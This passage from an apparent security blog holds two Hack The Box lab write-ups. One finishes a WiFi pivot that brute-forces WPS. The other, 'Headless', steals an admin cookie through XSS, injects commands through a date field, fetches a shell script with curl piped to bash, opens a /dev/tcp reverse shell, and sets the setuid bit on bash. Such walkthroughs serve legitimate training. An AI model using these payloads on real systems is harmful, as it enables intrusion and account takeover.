<p><img src="/images/HTB-WifineticTwo/foothold.png" alt="WifineticTwo foothold"></p>
<p>Our shell can be upgraded with the commands below.</p>
<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><p>We are connected as <code>root</code> and we recover the user flag in <code>/root</code>.</p>
<p><img src="/images/HTB-WifineticTwo/user-flag.png" alt="WifineticTwo user flag"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>It is definitely odd that we were already root for the first flag. This probably means that we need to do some kind of pivoting or access another service.</p>
<p>The name of this box obviously points at WiFi so let&rsquo;s check the network interfaces with <code>ifconfig</code>.</p>
<p><img src="/images/HTB-WifineticTwo/ifconfig-cmd.png" alt="WifineticTwo ifconfig command"></p>
<p>We find a wireless network interface <code>wlan0</code>, we know that HTB machines are VMs and do not have internet access so this network interface probably is leveraging some WiFi virtualization.</p>
<p>We can retrieve information about the wireless interface with <code>iw dev wlan0 scan</code>. In our case the scan reveals a WiFi network called <code>plcrouter</code> with a BSSID of <code>02:00:00:00:01:00</code>, it is also running <code>WPS: Version: 1.0</code>.</p>
<p><img src="/images/HTB-WifineticTwo/iw-scan.png" alt="WifineticTwo iw scan"></p>
<p>After reading the <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#wps" target="_blank" >Pentesting Wifi page</a>

 on HackTricks, we discovered that we can brute-force WPS keys. Our issue is that in order to use tools such as <code>reaver</code> and <code>bully</code> we need a wireless adapter (which I do not have currently). Fortunately we can also use <a href="https://github.com/nikita-yfh/OneShot-C" target="_blank" >OneShot-C</a>

 to perform the attack.</p>
<blockquote>
<p>I ended up using the <a href="https://github.com/kimocoder/OneShot" target="_blank" >Python version</a>

 of OneShot because I had issues compiling the C version.</p>
</blockquote>
<p>We clone the repo, and send the <code>oneshot.py</code>  file to the target with <code>curl</code>.</p>
<p><img src="/images/HTB-WifineticTwo/oneshot-py.png" alt="One-shot-py"></p>
<p>We can see how to use the script with <code>python3 oneshot.py -h</code>.</p>
<p><img src="/images/HTB-WifineticTwo/oneshot-py-help.png" alt="One-shot-py help"></p>
<p>We then run our attack with the command below using the interface name and the BSSID. We successfully recover the key which is <code>NoWWEDoKnowWhaTisReal123!</code>.</p>
<pre tabindex="0"><code>python3 ./oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
</code></pre><p><img src="/images/HTB-WifineticTwo/oneshot-attack.png" alt="One-shot attack"></p>
<p>Now we need to learn how to connect to WiFi from the command line. We learn from <a href="https://askubuntu.com/questions/138472/how-do-i-connect-to-a-wpa-wifi-network-using-the-command-line" target="_blank" >this thread</a>

 and <a href="https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line" target="_blank" >that one</a>

 that we need a configuration file.</p>
<p>We create it with <code>wpa_passphrase</code>.</p>
<pre tabindex="0"><code>wpa_passphrase &#39;plcrouter&#39; &#39;NoWWEDoKnowWhaTisReal123!&#39; &gt; wpa.conf
</code></pre><p><img src="/images/HTB-WifineticTwo/wpa_passphrase.png" alt="WPA config file"></p>
<blockquote>
<p>The WPA supplicant process is responsible for managing wireless connections on Linux systems.</p>
</blockquote>
<pre tabindex="0"><code>wpa_supplicant -B -c wpa.conf -i wlan0
</code></pre><p><img src="/images/HTB-WifineticTwo/wpa_supplicant.png" alt="WPA supplicant"></p>
<p>We verify the interface configuration with <code>iwconfig</code>.</p>
<p><img src="/images/HTB-WifineticTwo/iwconfig.png" alt="iwconfig command"></p>
<p>Using <code>ifconfig</code> we can see that the interface is up but there is no IP address configured for <code>wlan0</code>.</p>
<p><img src="/images/HTB-WifineticTwo/ifconfig-noIP.png" alt="wlan0 no IP address"></p>
<p>We can manually set an IP address with</p>
<pre tabindex="0"><code>ifconfig wlan0 &lt;IP_ADDRESS&gt; netmask &lt;NETWORK_MASK&gt;
</code></pre><pre tabindex="0"><code>ifconfig wlan0 192.168.1.50 netmask 255.255.255.0
</code></pre><p><img src="/images/HTB-WifineticTwo/ifconfig-IP.png" alt="ifconfig IP address"></p>
<p>Now that we have our new interface properly set up let&rsquo;s scan it in hopes of discovering more leads.</p>
<p>We download the nmap binary from <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap" target="_blank" >here</a>

 and send it to the target. Make sure to make it executable with <code>chmod +x nmap</code>.</p>
<pre tabindex="0"><code>./nmap -sn 192.168.1.0/24
</code></pre><p>We see the default gateway <code>192.168.1.1</code> and our configured address <code>192.168.1.50</code> among others.</p>
<p><img src="/images/HTB-WifineticTwo/nmap_scan.png" alt="nmap scan configured IP address"></p>
<p>After scanning the default gateway we discover more services, we will need some tunneling to access them (I used chisel for this box).</p>
<p><img src="/images/HTB-WifineticTwo/nmap-internal.png" alt="nmap default gateway scan"></p>
<p>We find a page with a title of <code>ap - LuCI</code>, which is referring to the <a href="https://launchpad.net/luci" target="_blank" >Lua Configuration Interface</a>

, &ldquo;a collection of free Lua software for embedded devices.&rdquo;</p>
<p><img src="/images/HTB-WifineticTwo/LuCI.png" alt="LuCI page"></p>
<p>For the authentication <code>root</code> will work for the password and we are asked to configure a new one.</p>
<p>Under <code>System</code> &ndash;&gt; <code>Administration</code> we notice that we have the option to login with a password.</p>
<p><img src="/images/HTB-WifineticTwo/LuCI-SSH-access.png" alt="LuCI SSH access"></p>
<p>With our newly configured password we login via SSH and find the root flag.</p>
<p><img src="/images/HTB-WifineticTwo/root-flag.png" alt="Root flag"></p>
<h2 id="closing-words">Closing Words</h2>
<p>I enjoyed this box as it was a nice change of pace from the usual web-based exploitation, I hope I was able to be helpful with this write up. Thank you for checking my blog!</p>
]]></content>
        </item>
        
        <item>
            <title>HTB: Headless</title>
            <link>https://scorpiosec.com/posts/2024/07/htb-headless/</link>
            <pubDate>Fri, 19 Jul 2024 22:17:23 -0500</pubDate>
            
            <guid>https://scorpiosec.com/posts/2024/07/htb-headless/</guid>
            <description>Platform: Hack The Box Link: Headless Level: Easy OS: Linux Headless starts with a static website. Through enumeration, we identify a contact form vulnerable to Cross-Site Scripting (XSS), though basic payloads prove ineffective. By capturing the admin&amp;rsquo;s cookie value, we gain access to the dashboard page and establish our foothold through command injection. For privilege escalation, we exploit a custom script to take control of the root account.
Target IP address - 10.</description>
            <content type="html"><![CDATA[<ul>
<li>Platform: Hack The Box</li>
<li>Link: <a href="https://app.hackthebox.com/machines/Headless" target="_blank" >Headless</a>

</li>
<li>Level: Easy</li>
<li>OS: Linux</li>
</ul>
<hr>
<p>Headless starts with a static website. Through enumeration, we identify a contact form vulnerable to Cross-Site Scripting (XSS), though basic payloads prove ineffective. By capturing the admin&rsquo;s cookie value, we gain access to the dashboard page and establish our foothold through command injection. For privilege escalation, we exploit a custom script to take control of the root account.</p>
<p>Target IP address - <code>10.10.11.8</code></p>
<h2 id="scanning">Scanning</h2>
<pre tabindex="0"><code>nmap -sC -sV -oA nmap/Headless 10.10.11.8
</code></pre><p><strong>Results</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-04 13:01 CDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.8
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.067s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>5000/tcp open  upnp?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   GetRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.2.2 Python/3.11.2
</span></span><span style="display:flex;"><span>|     Date: Thu, <span style="color:#ae81ff">04</span> Apr <span style="color:#ae81ff">2024</span> 18:01:48 GMT
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">2799</span>
</span></span><span style="display:flex;"><span>|     Set-Cookie: is_admin<span style="color:#f92672">=</span>InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path<span style="color:#f92672">=</span>/
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;head&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;Under Construction&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;style&gt;
</span></span><span style="display:flex;"><span>|     body <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>|     font-family: <span style="color:#e6db74">&#39;Arial&#39;</span>, sans-serif;
</span></span><span style="display:flex;"><span>|     background-color: <span style="color:#75715e">#f7f7f7;</span>
</span></span><span style="display:flex;"><span>|     margin: 0;
</span></span><span style="display:flex;"><span>|     padding: 0;
</span></span><span style="display:flex;"><span>|     display: flex;
</span></span><span style="display:flex;"><span>|     justify-content: center;
</span></span><span style="display:flex;"><span>|     align-items: center;
</span></span><span style="display:flex;"><span>|     height: 100vh;
</span></span><span style="display:flex;"><span>|     .container <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>|     text-align: center;
</span></span><span style="display:flex;"><span>|     background-color: <span style="color:#75715e">#fff;</span>
</span></span><span style="display:flex;"><span>|     border-radius: 10px;
</span></span><span style="display:flex;"><span>|     box-shadow: 0px 0px 20px rgba<span style="color:#f92672">(</span>0, 0, 0, 0.2<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>|   RTSPRequest: 
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML&gt;
</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;head&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
</span></span><span style="display:flex;"><span>|     &lt;body&gt;
</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;Message: Bad request version <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;RTSP/1.0&#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code explanation: <span style="color:#ae81ff">400</span> - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>SF-Port5000-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>4/4%Time<span style="color:#f92672">=</span>660EEB0C%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>SF:GetRequest,BE1,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20Python/3\.11\.2\r\nDate:\x20Thu,\x2004\x20Apr\x202024\x2018:01:48\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zf
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:s;\x20Path=/\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=device-widt
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:h,\x20initial-scale=1\.0\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Under\x20Constructi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:on&lt;/title&gt;\n\x20\x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20bo
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:dy\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20&#39;Arial&#39;,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20dis
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:play:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20a
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:lign-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,16C,<span style="color:#e6db74">&#34;&lt;!DOCTYPE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20HTML&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20respo
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nse&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20versi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:on\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 99.23 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<p>We find the port 22 running SSH and the port 5000 but the service running on it is not immediately recognized. A few other things can be noted:</p>
<ul>
<li>It appears to be a web server based on the response to the GetRequest probe.</li>
<li>The server software is identified as &ldquo;Werkzeug/2.2.2 Python/3.11.2&rdquo;, suggesting that it&rsquo;s running a Python web application using the <a href="https://werkzeug.palletsprojects.com/en/3.0.x/" target="_blank" >Werkzeug</a>

 framework.</li>
</ul>
<p>Visiting <code>http://10.10.11.8:5000/</code> we find to web page.</p>
<p><img src="/images/HTB-Headless/website-build.png" alt="Headless webiste"></p>
<p>Clicking on the only button present brings a contact form with the url <code>http://10.10.11.8:5000/support</code>.</p>
<p><img src="/images/HTB-Headless/contact-form.png" alt="Contact Support form"></p>
<p>Directory enumeration reveals <code>/dashboard</code> but that page is inaccessible at the moment and subdomain enumeration fails.</p>
<p><img src="/images/HTB-Headless/directory-bruteforcing.png" alt="Gobuster command results"></p>
<p><img src="/images/HTB-Headless/dashboard-page.png" alt="Dashboard page inaccessible"></p>
<p>We turn our focus to the contact form and test it for XSS.</p>
<p><img src="/images/HTB-Headless/XSS-attempt.png" alt="XSS attempt"></p>
<p>After the submission we get a message that a hacking attempt was detected. So we can assume that if our payload is able to bypass the detection mechanism we will be able to exploit the target in some way.</p>
<p><img src="/images/HTB-Headless/xss-detected.png" alt="XSS detected"></p>
<p>After multiple payloads failing, I notice the name of the cookie <code>is_admin</code>, if we get the correct value for it we will probably be able to access <code>/dashboard</code>. The current value of the cookie returns <code>user</code> (it appears to be base64 encoded).</p>
<p>The payloads available at <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" >PayloadsAllTheThings</a>

 all failed (or maybe I just could not make them work). Researching for alternatives ways, we find this <a href="https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e" target="_blank" >medium article</a>

 showcasing another way to steal the cookie.</p>
<blockquote>
<p>I tried the payload with the message parameter alone and it wasn&rsquo;t working but after adding it to <code>User-Agent</code> we are able to get the cookie value on our web server</p>
</blockquote>
<p><img src="/images/HTB-Headless/XSS-cookie-stealing-payload.png" alt="Cookie stealing via XSS"></p>
<p>The cookie is base64 encoded</p>
<p><img src="/images/HTB-Headless/admin-cookie-value.png" alt="Admin cookie value"></p>
<p><img src="/images/HTB-Headless/cookie-value-decoded.png" alt="Admin cookie value decoded"></p>
<p>We go back to the <code>/dashboard</code> page and by using the new cookie value <code>ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code> we get access to the Administrator Dashboard.</p>
<p><img src="/images/HTB-Headless/cookie-editor.png" alt="Cookie-Editor"></p>
<p><img src="/images/HTB-Headless/Admin-dashboard.png" alt="Admin dashboard accessed"></p>
<h2 id="initial-foothold">Initial Foothold</h2>
<p>The only option available is to select a date and generate a report. After capturing the request, we see that the only new parameter is <code>date</code>. Let&rsquo;s test for command injection via this parameter.</p>
<p><img src="/images/HTB-Headless/report-request.png" alt="Generate Report request"></p>
<p>We are indeed able to do some command injection via the parameter.</p>
<p><img src="/images/HTB-Headless/command-injection.png" alt="Command Injection verified"></p>
<p>Trying to get a reverse shell directly via the date parameter does not work, even though the previous command got executed.</p>
<pre tabindex="0"><code>date=2023-09-22;sh -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1
</code></pre><p>Since sending the reverse shell does not work we can try to execute it via curl by adding <code>bash</code> at the end of the command. We place the reverse shell in a file and we execute it on the target.</p>
<blockquote>
<p>Here is the reverse shell used: <code>sh -i &gt;&amp; /dev/tcp/IP_ADDRESS/PORT_NUMBER 0&gt;&amp;1</code></p>
</blockquote>
<pre tabindex="0"><code>curl http://IP:PORT/revshell.sh|bash
</code></pre><p><img src="/images/HTB-Headless/reverse-shell.png" alt="Reverse shell"></p>
<p>After sending the request we get a shell on our listener as the user <code>dvir</code>.</p>
<p><img src="/images/HTB-Headless/foothold.png" alt="Foothold"></p>
<p>We upgrade our shell with the commands below.</p>
<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty rows 38 columns 116 
</code></pre><p>In the home folder, we find the user flag.</p>
<p><img src="/images/HTB-Headless/user-flag.png" alt="User flag"></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Running <code>sudo -l</code> we discover that this user can run <code>/usr/bin/syscheck</code>.</p>
<p><img src="/images/HTB-Headless/sudo-l.png" alt="sudo -l command"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$EUID<span style="color:#e6db74">&#34;</span> -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>  exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>last_modified_time<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/find /boot -name <span style="color:#e6db74">&#39;vmlinuz*&#39;</span> -exec stat -c %Y <span style="color:#f92672">{}</span> + | /usr/bin/sort -n | /usr/bin/tail -n 1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>formatted_time<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/date -d <span style="color:#e6db74">&#34;@</span>$last_modified_time<span style="color:#e6db74">&#34;</span> +<span style="color:#e6db74">&#34;%d/%m/%Y %H:%M&#34;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#34;Last Kernel Modification Time: </span>$formatted_time<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>disk_space<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/df -h / | /usr/bin/awk <span style="color:#e6db74">&#39;NR==2 {print $4}&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#34;Available disk space: </span>$disk_space<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>load_average<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/uptime | /usr/bin/awk -F<span style="color:#e6db74">&#39;load average:&#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>/usr/bin/echo <span style="color:#e6db74">&#34;System load average: </span>$load_average<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ! /usr/bin/pgrep -x <span style="color:#e6db74">&#34;initdb.sh&#34;</span> &amp;&gt;/dev/null; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>  /usr/bin/echo <span style="color:#e6db74">&#34;Database service is not running. Starting it...&#34;</span>
</span></span><span style="display:flex;"><span>  ./initdb.sh 2&gt;/dev/null
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  /usr/bin/echo <span style="color:#e6db74">&#34;Database service is running.&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exit <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>The script does a number of things such as checking for root privileges, checking available disk space etc. But our way to root privileges is via the <code>initdb.sh</code> file.</p>
<p>We look for the file with <code>find / -type f -name 'initdb.sh' 2&gt;/dev/null</code> in order to modify it, but it is not on the system so we have to create it.</p>
<pre tabindex="0"><code>echo &#34;chmod u+s /bin/bash&#34; &gt; initdb.sh
</code></pre><p>The command above creates the file <code>initdb.sh</code> containing the command <code>chmod u+s /bin/bash</code> which sets the setuid bit (<code>u+s</code>) on the <code>/bin/bash</code> executable.</p>
<p>The user <code>dvir</code> is allowed to run the command <code>/usr/bin/syscheck</code> with sudo privileges without providing a password.</p>
<hr>
<h3 id="quick-explanation">Quick Explanation</h3>
<p><code>initdb.sh</code> is part of the script executed by <code>/usr/bin/syscheck</code>, and <code>initdb.sh</code> contains the command <code>chmod u+s /bin/bash</code>, so <code>dvir</code> can effectively gain root privileges by executing <code>/usr/bin/syscheck</code>. Here&rsquo;s how:</p>
<ol>
<li><code>dvir</code> runs <code>/usr/bin/syscheck</code> with sudo privileges.</li>
<li>Within the script executed by <code>/usr/bin/syscheck</code>, <code>initdb.sh</code> is executed.</li>
<li><code>initdb.sh</code> sets the setuid bit on <code>/bin/bash</code>, making <code>/bin/bash</code> run with the permissions of its owner (root) when executed by any user.</li>
<li>After <code>initdb.sh</code> has been executed, any subsequent execution of <code>/bin/bash</code> by <code>dvir</code> will run with root privileges, thanks to the setuid bit that was set.</li>
</ol>
<hr>
<p>After running <code>sudo /usr/bin/syscheck</code> and <code>/bin/bash -p</code> we become root and the flag is found at <code>/root/root.txt</code>.</p>
<p><img src="/images/HTB-Headless/root-flag.png" alt="root flag"></p>
<h2 id="closing-words">Closing Words</h2>
<p>This box was fairly easy but required a good understanding of Linux and Bash. You can learn about both on HackTheBox Academy with:</p>
<ul>
<li><a href="https://academy.hackthebox.com/module/details/18" target="_blank" >Linux Fundamentals</a>

 and <a href="https://academy.hackthebox.com/module/details/51" target="_blank" >Linux Privilege Escalation</a>

</li>
<li><a href="https://academy.hackthebox.com/module/details/21" target="_blank" >Introduction to Bash Scripting</a>

</li>
</ul>
<p>I also recommend checking out multiple write ups to have different perspectives, my go-tos are <a href="https://0xdf.gitlab.io/2024/07/20/htb-headless.html#" target="_blank" >0xdf</a>

